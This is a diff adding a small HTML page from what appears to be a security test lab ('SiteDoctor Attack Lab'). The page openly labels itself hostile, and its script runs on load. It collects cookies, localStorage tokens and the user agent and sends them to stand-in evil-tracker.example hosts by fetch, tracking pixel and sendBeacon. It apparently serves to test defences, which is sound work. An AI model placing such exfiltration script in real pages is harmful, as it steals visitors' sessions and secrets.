@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Attack 2 · Exfiltrate visitor data</title>
+
+<style>body{font:16px/1.6 system-ui,sans-serif;max-width:720px;margin:40px auto;padding:0 20px;color:#1d2430}h1{font-size:28px}.note{background:#fff4e5;border:1px solid #f3c27a;padding:12px 14px;border-radius:8px;font-size:14px}</style>
+</head>
+<body>
+<h1>Attack 2 · Exfiltrate visitor data</h1>
+<p class="note">SiteDoctor Attack Lab — this page is deliberately hostile. It attacks whatever opens it.</p>
+<p>A fake &quot;chat widget&quot; collects cookies, saved data and the browser fingerprint and sends them away.</p>
+<script>
+document.cookie="session=abc123secret; path=/";localStorage.setItem("token","sk-live-demo-123");(async()=>{const loot=document.cookie+"|"+JSON.stringify(localStorage)+"|"+navigator.userAgent;try{await fetch("https://collect.evil-tracker.example/steal",{method:"POST",body:loot})}catch(e){}new Image().src="https://pixel.evil-tracker.example/p.gif?cookie="+encodeURIComponent(document.cookie);try{navigator.sendBeacon("https://beacon.evil-tracker.example/b",loot)}catch(e){}})();
+</script>
+</body>
+</html>
